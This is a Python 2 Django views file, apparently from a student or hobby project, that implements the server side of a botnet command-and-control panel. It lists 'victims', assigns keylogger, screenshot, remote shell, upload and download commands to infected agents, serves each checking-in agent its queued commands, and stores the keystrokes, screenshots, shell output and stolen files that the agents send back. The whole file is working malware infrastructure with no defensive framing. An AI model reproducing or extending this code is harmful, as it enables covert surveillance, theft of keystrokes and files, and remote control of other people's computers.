# -*- coding: utf-8 -*-
"""
Created on Wed Apr 13 21:07:43 2016

@author: abdelmajid
"""

from datetime import datetime
from random import randint

import django.utils.timezone as djangotzone
from django.core.exceptions import ObjectDoesNotExist
from django.views.decorators.http import require_http_methods
from django.views.decorators.csrf import csrf_protect, requires_csrf_token
from django.shortcuts import render
from django.shortcuts import redirect #pour la rediréction
from django.http import HttpResponse, Http404
from django.conf import settings
from django.db import IntegrityError

from serviceapp.models import * #importer tous les modèles
from serviceapp import outils
# Create your views here.

#=====================================
def allVectims(request):
    """ la qui retourne toue les agents (client) stockés dans la BDD """
    clients=Client.objects.all()
    return render(request,"serviceapp/all_victimes.html",locals())

#=====================================
def get_all_commandes(request):
    """ la qui retourne toue les ommandes stockées dans la BDD """
    commandes=Commande.objects.all().order_by('-date_ajout')
    for cmd in commandes:
        cmd.nb_agents=len(cmd.clientcommande_set.all())#calculer le nombre des executeurs (agents).
    return render(request,"serviceapp/all_commandes.html",locals())

#======================================
def imagesscreenclient(request):
    """afficher les ScreenShot d'une client commande"""
    donnees=request.GET
    execs=[]
    if donnees is not None:
        try:
            id_cli_=donnees['idclient'][0]
            id_cmd_=donnees['idcmd'][0]
            cli=Client.objects.get(id_client=id_cli_)
            cmd=Commande.objects.get(id_cmd=id_cmd_)
            cli_cmd=ClientCommande.objects.get(client=cli,commande=cmd)
            execs=cli_cmd.screenshotexecution_set.all()
            #print "type::",type(execs[0].img_sse)#class:django.db.models.fields.files.ImageFieldFile
            #print "img:",repr(execs[0].img_sse)
            for img in execs:
                img.img_sse.name_affiche=img.img_sse.name.split("/")[-1]#ajouter un attribut pour l'affichage
        except:
            a='AMH'
    return render(request,"serviceapp/imgs_sc_cl.html",{"execs":execs})

#=====================================
def allMessages(request):
    """Vue récupére tous les messages"""
    messages=KeyLoggerExecution.objects.all()
    for msg in messages:
        #msg.vue=True
        #msg.save()
        msg.text_ke=msg.text_ke.split("<")
    return render(request,"serviceapp/all_messages.html",locals())

#=====================================
def messagesNvue(request):
    """Vue récupére tous les étudiants"""
    messages=KeyLoggerExecution.objects.all()
    msgsNvu=[msg for msg in messages if msg.vue==False]
    for msg in msgsNvu:
        msg.text_ke=msg.text_ke.split("<")
    return render(request,"serviceapp/msg_non_vue.html",{'messages':msgsNvu})

#=====================================
def messagesOfClient(request):
    """Vue récupére tous les étudiants"""
    client="client recupere"
    #messages=
    return render(request,"serviceapp/messages_of_vectim.html",locals())

#=====================================
def ajouter(request):
    """ la vue accueil """
    choix="Client"
    #print "Request:: ",request,locals()
    return render(request,"serviceapp/ajouter.html",locals())

#=====================================
@require_http_methods(["GET", "POST"])
def ajouterDon(request):
    """ la vue accueil """
    donnes=None
    if request.method=="POST":
        donnes=request.POST
    if request.method=="GET":
        donnes=request.GET
    if donnes is not None:
        _hostname=u""+donnes['hostname']
        _ipadresse=u""+donnes['ipadresse']
        _message=u""+donnes['message']

        try:
            cli=Client.objects.get(hostname=_hostname,ipadresse=_ipadresse)
        except ObjectDoesNotExist, ex:
            cli=Client.objects.create(hostname=_hostname,ipadresse=_ipadresse)
        try:
            mesg=KeyLoggerExecution.objects.create(client=cli,text_ke=_message)
        except:
            a=6# i d'ont know what I write here :O

    #print "Request:: ",request,locals()
    choix="Client"
    return render(request,"serviceapp/ajouter.html",locals())#redirection: remplce la


#=====================================
@require_http_methods(["POST",])
def reception(request):
    """ la vue accueil """
    donnes=request.POST
    if donnes is not None:
        _idbot=donnes['idbot']
        _hostname=donnes['hostname']
        _ipadresse=donnes['ipadresse']
        _message=donnes['message']
        #-----enregistrer
        adress_client=request.META['REMOTE_ADDR']
        #nom_hot_client=request.META['REMOTE_HOST']
        #_hostname+="/"+nom_hot_client
        _ipadresse+="/S:"+adress_client
        try:
            cli=Client.objects.get(id_client=_idbot)
        except ObjectDoesNotExist, ex:
            cli=Client.objects.create(hostname=_hostname,ipadresse=_ipadresse)
        try:
            mesg=KeyLoggerExecution.objects.create(client=cli,text_ke=_message)
        except:
            a=6# i d'ont know what I write here :O

    return HttpResponse('')

#=====================================
#    Nouvelle version
#=====================================

#=====================================
@require_http_methods(["POST",])
def gerer_commande(request):
    """ la vue qui gere une commande, afficher, supprimer, modifier, et s'afecter des agents """
    donnes=dict(request.POST)
    cmd,existe,action_,teste=None,False,None,False
    erreurs,clients="",None
    if donnes is not None:
        if "id_cmd" in donnes.keys():
            try:
                cmd=Commande.objects.get(id_cmd=int(donnes['id_cmd'][0]))
                existe=True
                if "action" in donnes.keys():
                    action=donnes['action'][0]
                    if action=="supprimer_bdd":
                        action_="supprimer_bdd"
                        cmd.delete()
                        teste=True
                    elif action=="afficher":
                        action_="afficher"
                    elif action=="modifier":
                        fmt='%Y-%m-%d %H:%M:%S'
                        cmd.date_ajout_for=cmd.date_ajout.strftime(fmt) if cmd.date_ajout is not None else ""
                        cmd.date_debut_for=cmd.date_debut.strftime(fmt) if cmd.date_debut is not None else ""
                        cmd.date_fin_for=cmd.date_fin.strftime(fmt) if cmd.date_fin is not None else ""
                        action_="modifier"
                    elif action=="modifier_bdd":
                        action_="modifier_bdd"
                        fmt='%Y-%m-%d %H:%M:%S'
                        try:
                            if 'titre' in donnes.keys():
                                tit_n=donnes['titre'][0]
                                cmd.titre=unicode(tit_n)
                            if 'date_debut' in donnes.keys():
                                dt_db=donnes['date_debut'][0]
                                ddt=datetime.strptime(dt_db, fmt)
                                cmd.date_debut=ddt
                            if 'date_fin' in donnes.keys():
                                dt_fn=donnes['date_fin'][0]
                                ddf=datetime.strptime(dt_fn, fmt)
                                cmd.date_fin=ddf
                            if 'texte' in donnes.keys():
                                text_n=donnes['texte'][0]
                                cmd.texte=int(text_n)
                            if 'active' in donnes.keys():
                                act_n=donnes['active'][0]
                                cmd.active=True
                            else:
                                cmd.active=False

                            cmd.save()
                            teste=True
                        except Exception, ex:
                            erreurs+=' '+unicode(ex)
                    elif action=="affecter":
                        action_="affecter"
                        clients=Client.objects.all()
                        for client in clients:
                            client.checked= ''
                            for md in client.clientcommande_set.all():
                                if md.commande == cmd :
                                    client.checked= 'checked="true"'
                                    break
                    elif action=="affecter_bdd":
                        action_="affecter_bdd"
                        keys=[k.split("_")[1] for k in donnes.keys() if k.startswith("client_")]
                        teste=True
                        if 'tous' in keys:
                            clts=Client.objects.all()
                            for cli in clts:
                                try:
                                    cmd_ex=ClientCommande.objects.create(client=cli, commande=cmd)
                                except IntegrityError, ie:
                                    a="C rien, clientCommande deja existe, pas d prob"# c rien
                                except Exception, ex:
                                    teste=False
                                    erreurs+=unicode(type(ex))+"\n"
                        else:
                            for kn in keys:
                                try:
                                    cl=Client.objects.get(id_client=kn)
                                    cmd_ex=ClientCommande.objects.create(client=cl, commande=cmd)
                                except IntegrityError, ie:
                                    a="clientCommande deja existe, pas d prob"# c rien
                                except Exception, ex:
                                    teste=False
                                    erreurs+=unicode(ex)+"\n"

            except ObjectDoesNotExist, ex:
                a=6#rien
    return render(request,"serviceapp/gerer_cmd.html",{"cmd":cmd,"existe":existe,"action":action_,"teste":teste,"erreurs":erreurs,"clients":clients})

#=====================================
@require_http_methods(["POST",])
def ajouter_cmd(request):
    """ La vue pour envoyer le formulaire et ajouter une commande """
    donnes=dict(request.POST)
    fmt='%Y-%m-%d %H:%M:%S'
    type_c,action_,teste=None,None,False
    cmd_url,cmd_tx="",""
    if donnes is not None:
        try:
            if "action" in donnes.keys():
                action_=donnes['action'][0]
                print "**************",action_
                if "type_cmd" in donnes.keys():
                    type_c=donnes['type_cmd'][0]
                    type_cd=TypeCommande.objects.get(nom=type_c)
                if action_=="add":
                    titre_cmd=donnes['titre_cmd'][0]
                    cmd_db=datetime.strptime(donnes['cmd_db'][0],fmt)
                    cmd_df=datetime.strptime(donnes['cmd_df'][0],fmt) if len(donnes['cmd_df'][0])>0 else None
                    if type_c in ["KeyLogger","ScreenShot"]:
                        cmd_tx=int(donnes['cmd_tx'][0])
                    else:
                        cmd_tx=donnes['cmd_tx'][0]
                    cmd_url=donnes['cmd_url'][0]
                    cmd=Commande.objects.create(type_cmd=type_cd,titre=titre_cmd,date_debut=cmd_db,date_fin=cmd_df,texte=cmd_tx,url=cmd_url)
                    teste=True
                #else action_=="forms":#pas de traitement
        except:
            teste=False

    date_ac=datetime.now().strftime(fmt)
    return render(request,"serviceapp/add_cmd.html",{"type_cmd":type_c,"date_act":date_ac,"action":action_,"teste":teste})


#=====================================
@require_http_methods(["POST",])
def get_client(request):
    """ la vue retourne un client s'il existe """
    donnes=dict(request.POST)
    clients=[]
    if donnes is not None:
        if "id_client" in donnes.keys():
            try:
                cli=Client.objects.get(id_client=int(donnes['id_client'][0]))
                clients.append(cli)
            except ObjectDoesNotExist, ex:
                a=6#rien
    return render(request,"serviceapp/client.html",locals())

#=====================================
@require_http_methods(["POST",])
def del_client(request):
    """ la vue supprime un Client s'il existe  """
    donnes=dict(request.POST)
    test=False
    cli=None
    if donnes is not None:
        if "id_client" in donnes.keys():
            try:
                cli=Client.objects.get(id_client=int(donnes['id_client'][0]))
                cli.delete()
                test=True
            except Except, ex:
                test=False
    return render(request,"serviceapp/supp_agent.html",{"supp":test,"client":cli})

#=====================================
@require_http_methods(["POST",])
def mod_client(request):
    """ la vue modifier un Client s'il existe (actif/inactif) """
    donnes=dict(request.POST)
    test=False
    cli,actif_,vue_=None,None,None
    if donnes is not None:
        if "id_client" in donnes.keys():
            if "actif" in donnes.keys():
                actif_=True if donnes['actif'][0]=='true' else False
            if "vue" in donnes.keys():
                vue_=True if donnes['vue'][0] in ['true','True'] else False#
            try:
                cli=Client.objects.get(id_client=int(donnes['id_client'][0]))
                cli.actif=cli.actif if actif_ is None else actif_
                cli.vue=cli.vue if vue_ is None else vue_
                cli.save()
                test=True
            except Exception, ex:
                test=False
    return render(request,"serviceapp/mod_agent.html",{"supp":test,"client":cli})

#=====================================
@require_http_methods(["POST",])
def mod_cmd_client(request):
    """ la vue modifier une commande d'un Client """
    donnes=dict(request.POST)
    test=False
    cli_cmd,vue_exec,active_,executee_=None,None,None,None
    action=""
    if donnes is not None:
        if "id_client" in donnes.keys() and "id_cmd" in donnes.keys():
            if "action" not in donnes.keys():
                action="notif"
                if "vue_exec" in donnes.keys():
                    vue_exec=True if donnes['vue_exec'][0] in ['true','True'] else False#
                try:
                    cli=Client.objects.get(id_client=int(donnes['id_client'][0]))
                    cmd=Commande.objects.get(id_cmd=int(donnes['id_cmd'][0]))
                    cli_cmd=ClientCommande.objects.get(client=cli,commande=cmd)
                    cli_cmd.execution_vue=cli_cmd.execution_vue if vue_exec is None else vue_exec
                    cli_cmd.save()
                    test=True
                except Exception, ex:
                    test=False
            else:
                action=donnes['action'][0]
                if action=="modif" and "executee" in donnes.keys():
                    executee_=True if donnes['executee'][0] in ['true','True'] else False#
                    try:
                        cli=Client.objects.get(id_client=int(donnes['id_client'][0]))
                        cmd=Commande.objects.get(id_cmd=int(donnes['id_cmd'][0]))
                        cli_cmd=ClientCommande.objects.get(client=cli,commande=cmd)
                        cli_cmd.executee=executee_
                        cli_cmd.execution_vue=not executee_
                        cli_cmd.save()
                        test=True
                    except Exception, ex:
                        print "erreur:",ex
                        test=False
                elif action=="exec_cslt":
                    try:
                        cli=Client.objects.get(id_client=int(donnes['id_client'][0]))
                        cmd=Commande.objects.get(id_cmd=int(donnes['id_cmd'][0]))
                        cli_cmd=ClientCommande.objects.get(client=cli,commande=cmd)
                        return HttpResponse(cli_cmd.executee)
                    except:
                        a=8
    return render(request,"serviceapp/mod_cli_cmd.html",{"mod":test,"client_cmd":cli_cmd,"action":action})

#=====================================
@require_http_methods(["POST",])
def execusions_cmd_client(request):
    """ La vue qui retourne tous les executions d'une commande par un Agent."""
    donnes=dict(request.POST)
    test=False
    execution,vue_exec=None,None
    cli_cmd,cli,cmd,execs=None,None,None,[]
    if donnes is not None:
        if "id_client" in donnes.keys() and "id_cmd" in donnes.keys():
            try:
                cli=Client.objects.get(id_client=int(donnes['id_client'][0]))
                cmd=Commande.objects.get(id_cmd=int(donnes['id_cmd'][0]))
                print cli.hostname,cmd.titre
                cli_cmd=ClientCommande.objects.get(client=cli,commande=cmd)
                if cmd.type_cmd.nom =="KeyLogger":
                    execs=KeyLoggerExecution.objects.filter(client_commande_ae=cli_cmd)
                    for ex in execs:
                        texte_tx=[]
                        for ligne in ex.text_ke.split("\n"):
                            print "ligne:",u""+ligne
                            ligne_tx=[]
                            tx=ligne.split(" ")
                            for t in tx:
                                if t.startswith("<kbd>") and t.endswith("</kbd>") :
                                    ligne_tx.append("<kbd>")
                                    ligne_tx.append(t[5:-6])
                                    ligne_tx.append("</kbd>")
                                else:
                                    ligne_tx.append(t)
                            texte_tx.append(ligne_tx)
                        ex.text_k=texte_tx

                if cmd.type_cmd.nom =="ScreenShot":
                    execs=ScreenShotExecution.objects.filter(client_commande_ae=cli_cmd).order_by('-date_insertion_ae')
                    for ex in execs:
                        ex.namef=ex.img_sse.name.split("/")[-1].split(".")[0]

                if cmd.type_cmd.nom =="Upload":
                    execs=UploadExecution.objects.filter(client_commande_ae=cli_cmd)
                if cmd.type_cmd.nom =="Download":
                    execs=DownloadExecution.objects.filter(client_commande_ae=cli_cmd)
                if cmd.type_cmd.nom =="Shell":
                    execs=ShellExecution.objects.filter(client_commande_ae=cli_cmd)
                    for ex in execs:
                        std=ex.resultats.split("Stdout:")[1]
                        ex.stdout=std.split("Stderr:")[0]
                        ex.stderr=std.split("Stderr:")[1]
                test=True
            except Exception, ex:
                test=False
    return render(request,"serviceapp/show_executions.html",{"test":test,"cli_cmd":cli_cmd,"execs":execs,"nb":len(execs)})

#=====================================
@require_http_methods(["POST",])
def mod_execution(request):
    """ la vue modifier une execution d'une commande par un client (partie d'execution)"""
    donnes=dict(request.POST)
    test=False
    execution,vue_exec,action=None,None,None
    if donnes is not None:
        if "id_ae" in donnes.keys() and "type_ae" in donnes.keys():
            if "vue_exec" in donnes.keys():
                vue_exec=True if donnes['vue_exec'][0] in ['true','True'] else False#
            type_e,id_e=donnes['type_ae'][0],donnes['id_ae'][0]
            try:
                if type_e=="KeyLogger":
                    execution=KeyLoggerExecution.objects.get(id_ae=id_e)
                if type_e=="ScreenShot":
                    execution=ScreenShotExecution.objects.get(id_ae=id_e)
                if type_e=="Upload":
                    execution=UploadExecution.objects.get(id_ae=id_e)
                if type_e=="Download":
                    execution=DownloadExecution.objects.get(id_ae=id_e)
                if type_e=="Shell":
                    execution=ShellExecution.objects.get(id_ae=id_e)

                if "action" in donnes.keys() and donnes['action'][0]=="supprimer":
                    action="supprimer"
                    execution.delete()
                    return HttpResponse("1")

                execution.vue=execution.vue if vue_exec is None else vue_exec
                execution.save()
                test=True
            except Exception, ex:
                test=False
    if action is not None:
        if action=="supprimer":
            return HttpResponse("0")
    return render(request,"serviceapp/mod_execution.html",{"mod":test,"exec":execution})

#=====================================
@require_http_methods(["POST",])
def get_cmds_client(request):
    """ la vue qui retournes toutes les commandes d'un agent  """
    donnes=dict(request.POST)
    cmds_cli,cli,test=[],None,False
    if donnes is not None:
        if "id_client" in donnes.keys():
            try:
                cli=Client.objects.get(id_client=int(donnes['id_client'][0]))
                cmds_cli=cli.clientcommande_set.all()
                if len(cmds_cli)>0:
                    test=True
            except Exception, ex:
                a=6#rien
    #print "NB",len(cmds_cli)
    return render(request,"serviceapp/clientcmds.html",{"cmds":cmds_cli,"client":cli,'test':test})

#=====================================
@require_http_methods(["POST",])
def notifications(request):
    """ la vue qui gerer les notifications d'arrivée des agents   """
    donnes=dict(request.POST)
    objets,test,data=[],False,{}
    if donnes is not None:
        notif=donnes['notif'][0]
        try:

            if notif=="newagents":
                objets=Client.objects.filter(vue=False)

            if notif=="newcommandes":
                objets=ClientCommande.objects.filter(executee=True,execution_vue=False)
            if notif=="newexecutions":
                objets+=list(KeyLoggerExecution.objects.filter(vue=False))
                objets+=list(ScreenShotExecution.objects.filter(vue=False))
                objets+=list(ShellExecution.objects.filter(vue=False))
                objets+=list(UploadExecution.objects.filter(vue=False))
                objets+=list(DownloadExecution.objects.filter(vue=False))
        except Exception, ex:
            a=6#rien
    return render(request,"serviceapp/notifications.html",{"objets":objets,"nb":len(objets),'notif':notif})

#======================================
def accueil(request):
    """ la vue accueil """
    return render(request,"serviceapp/accueil.html",locals())

#=====================================
@require_http_methods(["POST",])
def gerer_agent(request):
    """ Une vue tester si un agent est existe dans la base de donnée ou non,
    et le ajout s'il nexiste pas. et faire une mise à jours comme IPadresse, Pays et Continent si
    l'agent est existe. Et renvoie au agent ses commandes à éxecuter."""
    donnes=dict(request.POST)
    text="None"
    if donnes is not None:
        #donnes['iprecu']=request.META['REMOTE_ADDR'] #ajoute au serveur
        cli=None
        #print "donnee non None"
        if "id_client" in donnes.keys():
            #print "avec id"
            try:
                cli=Client.objects.get(id_client=int(donnes['id_client'][0]))
                outils.gerer_ip_pays_content_client(cli,donnes)
                #print u"existe et ip pays gerées"
            except ObjectDoesNotExist, ex:
                #print "Client non existe"
                cli=outils.ajouter_client(donnes)
                #print "client ahoutee"
        else:
            # ajout au base de donnes
            #print "sans id_client"
            cli=outils.ajouter_client(donnes)
            #print "client ajoutee",cli
    if cli is not None:
        cli.connecte=True
        cli.date_der_acces=djangotzone.now()
        cli.save()
        #--- regrouper les infos et les commandes de l'agent et les envoyer à lui :P.
        text=outils.text_envoyer_gerer_agent(cli)

    return HttpResponse(text)

#-------------------------------
@require_http_methods(["POST",])
def commande_executee(request):
    """ Une vue qui va modifier une commande d'un client (executee=True) """
    donnes=dict(request.POST)
    text="None"
    if donnes is not None:
        try:
            id_cli_=donnes['id_client'][0]
            id_cmd_=donnes['id_cmd'][0]
            cli=Client.objects.get(id_client=id_cli_)
            cmd=Commande.objects.get(id_cmd=id_cmd_)
            cli_cmd=ClientCommande.objects.get(client=cli,commande=cmd)
            cli_cmd.executee=True
            cli_cmd.save()
        except:
            a="rien"
    return HttpResponse('')

#---------------------------------
@require_http_methods(["POST",])
def save_screenshot_exec(request):
    """ Une vue qui va stocker les executions d'une attack ScreenShot (images) d'un agent."""
    donnes=dict(request.POST)
    if donnes is not None:
        try:
            id_cli_=donnes['id_client'][0]
            id_cmd_=donnes['id_cmd'][0]
            cli=Client.objects.get(id_client=id_cli_)
            cmd=Commande.objects.get(id_cmd=id_cmd_)
            cli_cmd=ClientCommande.objects.get(client=cli,commande=cmd)
            fichiers=request.FILES
            if fichiers is not None:
                #print "------Fichiers--------"
                #print fichiers
                for key in fichiers:
                    scr=ScreenShotExecution.objects.create(client_commande_ae=cli_cmd,img_sse=fichiers[key])
                #print "Type:",type(src.img_sse)
        except:
            a="rien"
    return HttpResponse('')

#---------------------------------
@require_http_methods(["POST",])
def save_keylogger_exec(request):
    """ Une vue qui va stocker les executions d'une commande Keylogger d'un agent."""
    donnes=dict(request.POST)
    if donnes is not None:
        try:
            id_cli_=donnes['id_client'][0]
            id_cmd_=donnes['id_cmd'][0]
            message_=donnes['message'][0]
            cli=Client.objects.get(id_client=id_cli_)
            cmd=Commande.objects.get(id_cmd=id_cmd_)
            cli_cmd=ClientCommande.objects.get(client=cli,commande=cmd)

            scr=KeyLoggerExecution.objects.create(client_commande_ae=cli_cmd,text_ke=message_)

        except:
            a="rien"

    return HttpResponse('')
#------------------------------
@require_http_methods(["POST",])
def save_shell_exec(request):
    """ Une vue qui va stocker les executions d'une attack Shll (resultats) d'un agent."""
    donnes=dict(request.POST)
    if donnes is not None:
        try:
            id_cli_=donnes['id_client'][0]
            id_cmd_=donnes['id_cmd'][0]
            resultats=donnes['resultats'][0]
            cli=Client.objects.get(id_client=id_cli_)
            cmd=Commande.objects.get(id_cmd=id_cmd_)
            cli_cmd=ClientCommande.objects.get(client=cli,commande=cmd)
            #---enregistrer les resultats
            scr=ShellExecution.objects.create(client_commande_ae=cli_cmd,resultats=unicode(resultats))
        except:
            a="rien"
    return HttpResponse('')

#---------------------------------
@require_http_methods(["POST",])
def save_upload_exec(request):
    """ Une vue qui va stocker les executions d'une attack Upload (fichiers) d'un agent."""
    donnes=dict(request.POST)
    if donnes is not None:
        try:
            id_cli_=donnes['id_client'][0]
            id_cmd_=donnes['id_cmd'][0]
            results_=donnes['results'][0]
            print "Fait:",results_
            cli=Client.objects.get(id_client=id_cli_)
            cmd=Commande.objects.get(id_cmd=id_cmd_)
            cli_cmd=ClientCommande.objects.get(client=cli,commande=cmd)
            fichiers=request.FILES
            if fichiers is not None and 'fichier' in fichiers:
                #print "------Fichiers--------"
                #print fichiers
                for key in fichiers:
                    upr=UploadExecution.objects.create(client_commande_ae=cli_cmd,results=unicode(results_),fichier=fichiers[key])
                #print "Type:",type(src.img_sse)
            else:
                upr=UploadExecution.objects.create(client_commande_ae=cli_cmd,results=unicode(results_))
        except:
            a="rien"
    return HttpResponse('')

#---------------------------------
@require_http_methods(["POST",])
def save_download_exec(request):
    """ Une vue qui va stocker les executions d'une attack Download (un fichier)
    dans la machine de l'agent."""
    donnes=dict(request.POST)
    if donnes is not None:
        try:
            id_cli_=donnes['id_client'][0]
            id_cmd_=donnes['id_cmd'][0]
            results_=donnes['results'][0]
            emplacement_=donnes['emplacement'][0]
            cli=Client.objects.get(id_client=id_cli_)
            cmd=Commande.objects.get(id_cmd=id_cmd_)
            cli_cmd=ClientCommande.objects.get(client=cli,commande=cmd)

            dor=DownloadExecution.objects.create(client_commande_ae=cli_cmd,results=unicode(results_),emplacement=emplacement_)

        except:
            a="rien"
    return HttpResponse('')
